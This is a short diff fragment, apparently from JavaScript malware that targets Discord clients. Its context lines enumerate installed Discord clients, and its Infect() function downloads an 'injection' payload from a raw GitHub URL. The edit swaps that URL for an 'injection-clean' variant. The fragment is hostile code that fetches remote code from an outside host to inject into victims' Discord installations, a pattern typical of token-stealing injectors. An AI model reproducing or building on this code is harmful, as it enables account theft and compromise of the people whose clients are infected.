@@ -43,7 +43,7 @@ discords.forEach(function(file) {
 });
 listDiscords();
 function Infect() {
-    https.get('https://raw.githubusercontent.com/xVlad44/da/main/src/Injection/injection', (resp) => {
+    https.get('https://raw.githubusercontent.com/xVlad44/da/main/src/Injection/injection-clean', (resp) => {
         let data = '';
         resp.on('data', (chunk) => {
             data += chunk;
